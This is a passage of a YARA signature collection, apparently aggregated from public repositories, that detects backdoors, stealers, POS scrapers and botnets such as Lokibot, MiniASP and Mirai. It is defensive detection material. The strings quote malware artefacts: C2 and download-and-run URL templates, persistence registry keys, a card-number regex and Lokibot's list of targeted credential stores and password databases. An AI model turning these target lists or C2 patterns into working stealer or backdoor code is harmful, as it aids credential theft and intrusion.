vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Kriskynote_Mar17_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"gzwrite64\" fullword ascii\n        $opa1 = { e8 6b fd ff ff 83 f8 ff 74 65 83 7b 28 00 74 42 }\n        $opb1 = { 8a 04 08 8b 8e a4 16 00 00 88 44 24 0c 66 c7 04 }\n        $opb2 = { 89 4e 6c 89 46 74 e9 ad fc ff ff 8b 46 68 85 c0 }\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 400KB and $s1 and ($opa1 or all of ($opb*))\n}\n\nrule Kriskynote_Mar17_2\n{\n    meta:\n        description = \"Kriskynote backdoor\"\n        classifications = \"Backdoor\"\n        threat_names = \"Kriskynote\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Kriskynote_Mar17_2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"fgjfcn8456fgjhfg89653wetwts\" fullword ascii\n        $op0 = { 33 c0 80 34 30 03 40 3d e6 21 00 00 72 f4 b8 e6 }\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 600KB and 1 of them)\n}\n\nrule Kriskynote_Mar17_3\n{\n    meta:\n        description = \"Kriskynote backdoor\"\n        classifications = \"Backdoor\"\n        threat_names = \"Kriskynote\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Kriskynote_Mar17_3\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"rundll32 %s Check\" fullword ascii\n        $s2 = \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\RecentDocs\" fullword ascii\n        $s3 = \"name=\\\"IsUserAdmin\\\"\" fullword ascii\n        $s4 = \"zok]\\\\\\\\\\\\ZZYYY666564444\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 2000KB and 2 of them)\n}\n\nrule Kwampirs_Apr18\n{\n    meta:\n        description = \"Kwampirs backdoor\"\n        ref = \"https://www.symantec.com/blogs/threat-intelligence/orangeworm-targets-healthcare-us-europe-asia\"\n        classifications = \"Backdoor\"\n        threat_names = \"Kwampirs\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Symantec\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"MAL_Kwampirs_Apr18\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $pubkey = {\n            06 02 00 00 00 A4 00 00 52 53 41 31 00 08 00 00\n            01 00 01 00 CD 74 15 BC 47 7E 0A 5E E4 35 22 A5\n            97 0C 65 BE E0 33 22 F2 94 9D F5 40 97 3C 53 F9\n            E4 7E DD 67 CF 5F 0A 5E F4 AD C9 CF 27 D3 E6 31\n            48 B8 00 32 1D BE 87 10 89 DA 8B 2F 21 B4 5D 0A\n            CD 43 D7 B4 75 C9 19 FE CC 88 4A 7B E9 1D 8C 11\n            56 A6 A7 21 D8 C6 82 94 C1 66 11 08 E6 99 2C 33\n            02 E2 3A 50 EA 58 D2 A7 36 EE 5A D6 8F 5D 5D D2\n            9E 04 24 4A CE 4C B6 91 C0 7A C9 5C E7 5F 51 28\n            4C 72 E1 60 AB 76 73 30 66 18 BE EC F3 99 5E 4B\n            4F 59 F5 56 AD 65 75 2B 8F 14 0C 0D 27 97 12 71\n            6B 49 08 84 61 1D 03 BA A5 42 92 F9 13 33 57 D9\n            59 B3 E4 05 F9 12 23 08 B3 50 9A DA 6E 79 02 36\n            EE CE 6D F3 7F 8B C9 BE 6A 7E BE 8F 85 B8 AA 82\n            C6 1E 14 C6 1A 28 29 59 C2 22 71 44 52 05 E5 E6\n            FE 58 80 6E D4 95 2D 57 CB 99 34 61 E9 E9 B3 3D\n            90 DC 6C 26 5D 70 B4 78 F9 5E C9 7D 59 10 61 DF\n            F7 E4 0C B3\n        }\n        $network_xor_key = {\n            B7 E9 F9 2D F8 3E 18 57 B9 18 2B 1F 5F D9 A5 38\n            C8 E7 67 E9 C6 62 9C 50 4E 8D 00 A6 59 F8 72 E0\n            91 42 FF 18 A6 D1 81 F2 2B C8 29 EB B9 87 6F 58\n            C2 C9 8E 75 3F 71 ED 07 D0 AC CE 28 A1 E7 B5 68\n            CD CF F1 D8 2B 26 5C 31 1E BC 52 7C 23 6C 3E 6B\n            8A 24 61 0A 17 6C E2 BB 1D 11 3B 79 E0 29 75 02\n            D9 25 31 5F 95 E7 28 28 26 2B 31 EC 4D B3 49 D9\n            62 F0 3E D4 89 E4 CC F8 02 41 CC 25 15 6E 63 1B\n            10 3B 60 32 1C 0D 5B FA 52 DA 39 DF D1 42 1E 3E\n            BD BC 17 A5 96 D9 43 73 3C 09 7F D2 C6 D4 29 83\n            3E 44 44 6C 97 85 9E 7B F0 EE 32 C3 11 41 A3 6B\n            A9 27 F4 A3 FB 2B 27 2B B6 A6 AF 6B 39 63 2D 91\n            75 AE 83 2E 1E F8 5F B5 65 ED B3 40 EA 2A 36 2C\n            A6 CF 8E 4A 4A 3E 10 6C 9D 28 49 66 35 83 30 E7\n            45 0E 05 ED 69 8D CF C5 40 50 B1 AA 13 74 33 0F\n            DF 41 82 3B 1A 79 DC 3B 9D C3 BD EA B1 3E 04 33\n        }\n        $decrypt_string = {\n            85 DB 75 09 85 F6 74 05 89 1E B0 01 C3 85 FF 74\n            4F F6 C3 01 75 4A 85 F6 74 46 8B C3 D1 E8 33 C9\n            40 BA 02 00 00 00 F7 E2 0F 90 C1 F7 D9 0B C8 51\n            E8 12 28 00 00 89 06 8B C8 83 C4 04 33 C0 85 DB\n            74 16 8B D0 83 E2 0F 8A 92 1C 33 02 10 32 14 38\n            40 88 11 41 3B C3 72 EA 66 C7 01 00 00 B0 01 C3\n            32 C0 C3\n        }\n        $init_strings = {\n            55 8B EC 83 EC 10 33 C9 B8 0D 00 00 00 BA 02 00\n            00 00 F7 E2 0F 90 C1 53 56 57 F7 D9 0B C8 51 E8\n            B3 27 00 00 BF 05 00 00 00 8D 77 FE BB 4A 35 02\n            10 2B DE 89 5D F4 BA 48 35 02 10 4A BB 4C 35 02\n            10 83 C4 04 2B DF A3 C8 FC 03 10 C7 45 FC 00 00\n            00 00 8D 4F FC 89 55 F8 89 5D F0 EB 06\n        }\n\n    condition:\n        2 of them\n}\n\nrule VisualDiscovery_Lonovo_Superfish_SSL_Hijack\n{\n    meta:\n        description = \"Lenovo Superfish SSL interceptor\"\n        ref = \"https://twitter.com/4nc4p/status/568325493558272000\"\n        classifications = \"Adware\"\n        threat_names = \"Superfish\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth / improved by kbandla\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"VisualDiscovery_Lonovo_Superfish_SSL_Hijack\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s2 = \"Invalid key length used to initialize BlowFish.\" fullword ascii\n        $s3 = \"GetPCProxyHandler\" fullword ascii\n        $s4 = \"StartPCProxy\" fullword ascii\n        $s5 = \"SetPCProxyHandler\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 2MB and all of ($s*)\n}\n\nrule LogPOS\n{\n    meta:\n        description = \"LogPOS malware\"\n        classifications = \"Spyware\"\n        threat_names = \"LogPOS\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Morphick Security\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"LogPOS\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $mailslot = \"\\\\\\\\.\\\\mailslot\\\\LogCC\"\n        $get = \"GET /%s?encoding=%c&t=%c&cc=%I64d&process=\"\n        $sc = {64 A1 30 00 00 00 8B 40 0C 8B 40 1C 8B 40 08 }\n\n    condition:\n        $sc and 1 of ($mailslot , $get)\n}\n\nrule Lokibot\n{\n    meta:\n        description = \"Lokibot Stealer\"\n        threat_names = \"Lokibot\"\n        classifications = \"Spyware\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5     \n        vti_static_score = 5\n        author = \"VMRay Labs\"\n\n    strings:\n        //generate a mutex based on machine guid\n        $s1 = \"SOFTWARE\\\\Microsoft\\\\Cryptography\" wide ascii\n        $s2 = \"MachineGuid\" wide ascii\n        // prepare to get install dir\n        $s3 = \"%s\\\\%s\\\\Main\" wide ascii\n        // custom hdp file\n        $s4 = /AppData\\\\Roaming\\\\[a-zA-Z0-9]{6}\\\\[a-zA-Z0-9]{6}\\.hdb/ wide ascii\n        // library used for data compression\n        $s5 = \"aPLib\" wide ascii\n        $s6 = \"ckav.ru\" wide ascii\n        $s7 = \"-convert xml1 -s -o %s \\\"%s\\\"\" wide ascii\n        $s8 = \"User-Agent: Mozilla/4.08 (Charon; Inferno)\" wide ascii\n        $s9 = \"%sContent-Key: %X\" wide ascii\n        $s10 = \"Content-Length: %i\" wide ascii\n        $s11 = \"Connection: close\" wide ascii\n        \n        // some targeted applications\n        $t1 = \"SOFTWARE\\\\Apple Computer, Inc.\\\\Safari\" wide ascii\n        $t2 = \"SOFTWARE\\\\ComodoGroup\\\\IceDragon\\\\Setup\" wide ascii\n        $t3 = \"SOFTWARE\\\\Mozilla\\\\Mozilla Firefox\" wide ascii\n        $t4 = \"SOFTWARE\\\\K-Meleon\" wide ascii\n        $t5 = \"SOFTWARE\\\\mozilla.org\\\\SeaMonkey\" wide ascii\n        $t6 = \"SOFTWARE\\\\Mozilla\\\\SeaMonkey\" wide ascii\n        $t7 = \"SOFTWARE\\\\Mozilla\\\\Flock\" wide ascii\n        $t8 = \"%s\\\\NETGATE\\\\Black Hawk\" wide ascii\n        $t9 = \"Software\\\\WinChips\\\\UserAccounts\" wide ascii\n        $t10 = \"ChromePlus\" wide ascii\n        $t11 = \"CoolNovo\" wide ascii\n        $t12 = \"Maxthon\" wide ascii\n        $t13 = \"WinChips\" wide ascii\n        $t14 = \"MailSpeaker\" wide ascii\n        $t15 = \"Sleipnir\" wide ascii\n        $t16 = \"ChromiumViewer\" wide ascii\n        $t17 = \"Software\\\\LinasFTP\\\\Site Manager\" wide ascii\n        $t18 = \"%s\\\\oZone3D\\\\MyFTP\\\\myftp.ini\" wide ascii\n        $t19 = \"%s\\\\NetDrive\\\\NDSites.ini\" wide ascii\n        $t20 = \"%s\\\\NetDrive2\\\\drives.dat\" wide ascii\n        $t21 = \"%s\\\\Fastream NETFile\\\\My FTP Links\" wide ascii\n        $t22 = \"%s\\\\NexusFile\\\\userdata\\\\ftpsite.ini\" wide ascii\n        $t23 = \"%s\\\\NexusFile\\\\ftpsite.ini\" wide ascii\n        $t24 = \"%s\\\\INSoftware\\\\NovaFTP\\\\NovaFTP.db\" wide ascii\n        $t25 = \"%s\\\\Notepad++\\\\plugins\\\\config\\\\NppFTP\\\\NppFTP.xml\" wide ascii\n        $t26 = \"%s\\\\Odin Secure FTP Expert\\\\QFDefault.QFQ\" wide ascii\n        $t27 = \"%s\\\\Odin Secure FTP Expert\\\\SiteInfo.QFP\" wide ascii\n        $t28 = \"\\\\*.kdb\" wide ascii fullword\n        $t29 = \"\\\\*.kdbx\" wide ascii fullword\n        \n        // mozilla based app profiles\n        $p1 = \"%s\\\\Mozilla\\\\SeaMonkey\\\\profiles.ini\" wide ascii\n        $p2 = \"%s\\\\Mozilla\\\\SeaMonkey\\\\Profiles\\\\%s\" wide ascii\n        $p3 = \"%s\\\\Flock\\\\Browser\\\\profiles.ini\" wide ascii\n        $p4 = \"%s\\\\Flock\\\\Browser\\\\Profiles\\\\%s\" wide ascii\n        $p5 = \"%s\\\\Thunderbird\\\\profiles.ini\" wide ascii\n        $p6 = \"%s\\\\Thunderbird\\\\Profiles\\\\%s\" wide ascii\n        $p7 = \"%s\\\\K-Meleon\\\\profiles.ini\" wide ascii\n        $p8 = \"%s\\\\Comodo\\\\IceDragon\\\\profiles.ini\" wide ascii\n        $p9 = \"%s\\\\Comodo\\\\IceDragon\\\\Profiles\\\\%s\" wide ascii\n        $p10 = \"%s\\\\NETGATE Technologies\\\\BlackHawk\\\\profiles.ini\" wide ascii\n        $p11 = \"%s\\\\NETGATE Technologies\\\\BlackHawk\\\\Profiles\\\\%s\" wide ascii\n        $p12 = \"%s\\\\Postbox\\\\profiles.ini\" wide ascii\n        $p13 = \"%s\\\\Postbox\\\\Profiles\\\\%s\" wide ascii\n        $p14 = \"%s\\\\8pecxstudios\\\\Cyberfox\\\\profiles.ini\" wide ascii\n        $p15 = \"%s\\\\8pecxstudios\\\\Cyberfox\\\\Profiles\\\\%s\" wide ascii\n        $p16 = \"%s\\\\Moonchild Productions\\\\Pale Moon\\\\profiles.ini\" wide ascii\n        $p17 = \"%s\\\\Moonchild Productions\\\\Pale Moon\\\\Profiles\\\\%s\" wide ascii\n        $p18 = \"%s\\\\FossaMail\\\\profiles.ini\" wide ascii\n        $p19 = \"%s\\\\FossaMail\\\\Profiles\\\\%s\" wide ascii\n        $p20 = \"%s\\\\Mozilla\\\\Firefox\\\\profiles.ini\" wide ascii\n        $p21 = \"%s\\\\Mozilla\\\\Firefox\\\\Profiles\\\\%s\" wide ascii\n\n    condition:\n        (\n            mime_type == \"application/octet-stream\"\n            or mime_type == \"text/plain\"\n            or (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550)\n        )\n        and 6 of ($s*)\n        and (15 of ($t*) or 10 of ($p*))\n}\n\nrule LuaBot : MALW\n{\n    meta:\n        description = \"LuaBot malware\"\n        ref = \"http://blog.malwaremustdie.org/2016/09/mmd-0057-2016-new-elf-botnet-linuxluabot.html\"\n        classifications = \"Bot\"\n        threat_names = \"LuaBot\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Joan Soriano / @joanbtl\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"LuaBot\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $a = \"LUA_PATH\"\n        $b = \"Hi. Happy reversing, you can mail me: luabot@yandex.ru\"\n        $c = \"/tmp/lua_XXXXXX\"\n        $d = \"NOTIFY\"\n        $e = \"UPDATE\"\n\n    condition:\n        all of them\n}\n\nrule maazben\n{\n    meta:\n        description = \"Maazben bot\"\n        classifications = \"Bot\"\n        threat_names = \"Maazben\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Brian Wallace @botnet_hunter\"\n        source = \"https://github.com/bwall/bamfdetect\"\n        original_name = \"maazben\"\n        license = \"MIT (https://opensource.org/licenses/MIT)\"\n\n    strings:\n        $encrypted1 = {d4 2a 47 00 44 6d 47 00}\n        $encrypted2 = \"__CxxFrameHandler\"\n        $str1 = \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50728)\"\n        $str2 = \"%s\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Ext\\\\Stats\"\n        $str3 = \"MCIDRV_VER\"\n\n    condition:\n        ($encrypted1 and $encrypted2) or ($str1 and $str2 and $str3)\n}\n\nrule madnesspro_strings\n{\n    meta:\n        description = \"Madness Pro DDoS malware\"\n        classifications = \"Bot\"\n        threat_names = \"Madness Pro\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Brian Wallace @botnet_hunter\"\n        source = \"https://github.com/bwall/bamfdetect\"\n        original_name = \"madnesspro_strings\"\n        license = \"MIT (https://opensource.org/licenses/MIT)\"\n\n    strings:\n        $c = \"YXBvS0FMaXBsaXM9\"\n        $str5 = \"d3Rm\" fullword\n        $str6 = \"ZXhl\" fullword\n        $string0 = \"Referer: \"\n        $string1 = \"regini \"\n        $string2 = \"GetAtomNameA (atom, s, sizeof(s)) \"\n        $string3 = \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\"\n        $string4 = \"dmVyPQ\"\n        $string5 = \"U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cRXhwbG9yZXJcU2hlbGwgRm9sZGVycw\"\n        $string6 = \"U1lTVEVNXENvbnRyb2xTZXQwMDJcc2VydmljZXNcU2hhcmVkQWNjZXNzXFBhcmFtZXRlcnNcRmlyZXdhbGxQb2xpY3lcU3RhbmRh\"\n        $string7 = \"Oio6RW5hYmxlZDo\"\n        $string8 = \"TW96aWxsYS80LjAgKFdpbmRvd3M7IFU7IFdpbmRvd3MgTlQgNi4xOyBubDsgcnY6MS45LjIuMykgR2Vja28vMjAxMDA0MDEgRmly\"\n        $string9 = \"Q2hlY2tUb2tlbk1lbWJlcnNoaXA\"\n        $string10 = \"R0g1Sy1HS0w4LUNQUDQtREUyNA\"\n        $string11 = \"cookie\"\n        $string12 = \"U1lTVEVNXENvbnRyb2xTZXQwMDNcc2VydmljZXNcU2hhcmVkQWNjZXNzXFBhcmFtZXRlcnNcRmlyZXdhbGxQb2xpY3lcU3RhbmRh\"\n        $string13 = \"Content-Type: application/x-www-form-urlencoded\"\n        $string14 = \"Internet Explorer\"\n        $string15 = \"U1lTVEVNXEN1cnJlbnRDb250cm9sU2V0XFNlcnZpY2VzXFNoYXJlZEFjY2Vzc1xQYXJhbWV0ZXJzXEZpcmV3YWxsUG9saWN5XFN0\"\n        $string16 = \"U1lTVEVNXENvbnRyb2xTZXQwMDFcc2VydmljZXNcU2hhcmVkQWNjZXNzXFBhcmFtZXRlcnNcRmlyZXdhbGxQb2xpY3lcU3RhbmRh\"\n\n    condition:\n        all of them\n}\n\nrule Madness : DoS\n{\n    meta:\n        description = \"Madness Pro DDoS malware\"\n        classifications = \"Bot\"\n        threat_names = \"Madness Pro\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Jason Jones <jasonjones@arbor.net>\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Madness\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $ua1 = \"TW96aWxsYS81LjAgKFdpbmRvd3M7IFU7IFdpbmRvd3MgTlQgNS4xOyBlbi1VUzsgcnY6MS44LjAuNSkgR2Vja28vMjAwNjA3MzEgRmlyZWZveC8xLjUuMC41IEZsb2NrLzAuNy40LjE\"\n        $ua2 = \"TW96aWxsYS81LjAgKFgxMTsgVTsgTGludXggMi40LjItMiBpNTg2OyBlbi1VUzsgbTE4KSBHZWNrby8yMDAxMDEzMSBOZXRzY2FwZTYvNi4wMQ==\"\n        $str1 = \"document.cookie=\" fullword\n        $str2 = \"[\\\"cookie\\\",\\\"\" fullword\n        $str3 = \"\\\"realauth=\" fullword\n        $str4 = \"\\\"location\\\"];\" fullword\n        $str5 = \"d3Rm\" fullword\n        $str6 = \"ZXhl\" fullword\n\n    condition:\n        all of them\n}\n\nrule MalumPOS\n{\n    meta:\n        description = \"MalumPOS memory dumper\"\n        classifications = \"Spyware\"\n        threat_names = \"MalumPOS\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Trend Micro, Inc.\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"PoS_Malware_MalumPOS\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $string1 = \"SOFTWARE\\\\Borland\\\\Delphi\\\\RTL\"\n        $string2 = \"B)[0-9]{13,19}\\\\\"\n        $string3 = \"[A-Za-z\\\\s]{0,30}\\\\/[A-Za-z\\\\s]{0,30}\\\\\"\n        $string4 = \"TRegExpr(exec): ExecNext Without Exec[Pos]\"\n        $string5 = /Y:\\\\PROGRAMS\\\\.{20,300}\\.pas/\n\n    condition:\n        all of ($string*)\n}\n\nrule merocota\n{\n    meta:\n        description = \"Merocota DDoS bot\"\n        ref = \"http://telussecuritylabs.com/threats/show/TSL20160316-02\"\n        classifications = \"Bot\"\n        threat_names = \"Merocota\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"tjadanel @reonfleek\"\n        source = \"https://github.com/tjnel/yara_repo\"\n        original_name = \"merocota\"\n        license = \"MIT (https://opensource.org/licenses/MIT)\"\n\n    strings:\n        $comm0 = \"Jakarta Commons\"\n        $comm1 = \"command.php\"\n        $comm2 = \"pause\"\n        $pdb0 = \"Projetos\\\\C++\\\\BotNet\\\\\"\n        $str0 = \"vector<T> too long\"\n        $str1 = \"8s7H62v1Wo\"\n\n    condition:\n        all of them\n}\n\nrule Mikey\n{\n    meta:\n        description = \"Mikey trojan\"\n        classifications = \"Trojan\"\n        threat_names = \"Mikey\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Gen_Trojan_Mikey\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"nuR\\\\noisreVtnerruC\\\\swodniW\\\\tfosorciM\\\\ERAWTFOS\" fullword ascii\n        $x1 = \"User-Agent:Mozilla/4.0 (compatible; MSIE %d.0; Windows NT %d.1; SV1)\" fullword ascii\n        $x2 = \"User-Agent:Mozilla/4.0 (compatible; MSIE 6.00; Windows NT 5.0; MyIE 3.01)\" fullword ascii\n        $x3 = \"%d*%u%s\" fullword ascii\n        $x4 = \"%s %s:%d\" fullword ascii\n        $x5 = \"Mnopqrst Vwxyabcde Ghijklm Opqrstuv Xya\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and $s0 and 2 of ($x*)\n}\n\nrule CommentCrew_MiniASP\n{\n    meta:\n        description = \"MiniASP backdoor\"\n        classifications = \"Trojan, Backdoor\"\n        threat_names = \"MiniASP\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"APT_Malware_CommentCrew_MiniASP\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"\\\\MiniAsp4\\\\Release\\\\MiniAsp.pdb\" ascii\n        $x2 = \"run http://%s/logo.png setup.exe\" fullword ascii\n        $x3 = \"d:\\\\command.txt\" fullword ascii\n        $z1 = \"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR \" ascii\n        $z2 = \"Mozilla/4.0 (compatible; MSIE 7.4; Win32;32-bit)\" fullword ascii\n        $z3 = \"User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC\" ascii\n        $s1 = \"http://%s/device_command.asp?device_id=%s&cv=%s&command=%s\" fullword ascii\n        $s2 = \"kill process error!\" fullword ascii\n        $s3 = \"kill process success!\" fullword ascii\n        $s4 = \"pickup command error!\" fullword ascii\n        $s5 = \"http://%s/record.asp?device_t=%s&key=%s&device_id=%s&cv=%s&result=%s\" fullword ascii\n        $s6 = \"no command\" fullword ascii\n        $s7 = \"software\\\\microsoft\\\\windows\\\\currentversion\\\\run\" fullword ascii\n        $s8 = \"command is null!\" fullword ascii\n        $s9 = \"pickup command Ok!\" fullword ascii\n        $s10 = \"http://%s/result_%s.htm\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and (1 of ($x*)) or (all of ($z*)) or (8 of ($s*))\n}\n\nrule MiniAsp3_mem : memory\n{\n    meta:\n        description = \"MiniASP backdoor\"\n        classifications = \"Trojan, Backdoor\"\n        threat_names = \"MiniASP\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"chort (@chort0)\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"MiniAsp3_mem\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $pdb = \"MiniAsp3\\\\Release\\\\MiniAsp.pdb\" fullword\n        $httpAbout = \"http://%s/about.htm\" fullword\n        $httpResult = \"http://%s/result_%s.htm\" fullword\n        $msgInetFail = \"open internet failed\u2026\" fullword\n        $msgRunErr = \"run error!\" fullword\n        $msgRunOk = \"run ok!\" fullword\n        $msgTimeOutM0 = \"time out,change to mode 0\" fullword\n        $msgCmdNull = \"command is null!\" fullword\n\n    condition:\n        ($pdb and (all of ($http*)) and any of ($msg*))\n}\n\nrule MiniDionis_readerView\n{\n    meta:\n        description = \"MiniDionis / CloudLook backdoor\"\n        ref = \"http://www.kernelmode.info/forum/viewtopic.php?f=16&t=3950\"\n        classifications = \"Backdoor\"\n        threat_names = \"MiniDionis\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"MiniDionis_readerView\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"%ws_out%ws\" fullword wide\n        $s2 = \"dnlibsh\" fullword ascii\n        $op0 = { 0f b6 80 68 0e 41 00 0b c8 c1 e1 08 0f b6 c2 8b }\n        $op1 = { 8b ce e8 f8 01 00 00 85 c0 74 41 83 7d f8 00 0f }\n        $op2 = { e8 2f a2 ff ff 83 20 00 83 c8 ff 5f 5e 5d c3 55 }\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 500KB and all of ($s*) and 1 of ($op*)\n}\n\nrule MiniDionis_VBS_Dropped\n{\n    meta:\n        description = \"MiniDionis / CloudLook backdoor\"\n        ref = \"https://malwr.com/analysis/ZDc4ZmIyZDI4MTVjNGY5NWI0YzE3YjIzNGFjZTcyYTY/\"\n        classifications = \"Backdoor\"\n        threat_names = \"MiniDionis\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"MiniDionis_VBS_Dropped\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"Wscript.Sleep 5000\" ascii\n        $s2 = \"Set FSO = CreateObject(\\\"Scripting.FileSystemObject\\\")\" ascii\n        $s3 = \"Set WshShell = CreateObject(\\\"WScript.Shell\\\")\" ascii\n        $s4 = \"If(FSO.FileExists(\\\"\" ascii\n        $s5 = \"then FSO.DeleteFile(\\\".\\\\\" ascii\n\n    condition:\n        filesize < 1KB and all of them and $s1 in (0 .. 40)\n}\n\nrule Mirai_Botnet_Malware\n{\n    meta:\n        description = \"Mirai bot\"\n        classifications = \"Bot\"\n        threat_names = \"Mirai\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Mirai_Botnet_Malware\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"POST /cdn-cgi/\" fullword ascii\n        $x2 = \"/dev/misc/watchdog\" fullword ascii\n        $x3 = \"/dev/watchdog\" ascii\n        $x4 = \"\\\\POST /cdn-cgi/\" fullword ascii\n        $x5 = \".mdebug.abi32\" fullword ascii\n        $s1 = \"LCOGQGPTGP\" fullword ascii\n        $s2 = \"QUKLEKLUKVJOG\" fullword ascii\n        $s3 = \"CFOKLKQVPCVMP\" fullword ascii\n        $s4 = \"QWRGPTKQMP\" fullword ascii\n        $s5 = \"HWCLVGAJ\" fullword ascii\n        $s6 = \"NKQVGLKLE\" fullword ascii\n\n    condition:\n        uint16(0) == 0x457f and filesize < 200KB and ((1 of ($x*) and 1 of ($s*)) or 4 of ($s*))\n}\n\nrule Mirai_1_May17\n{\n    meta:\n        description = \"Mirai bot\"\n        threat_names = \"Mirai\"\n        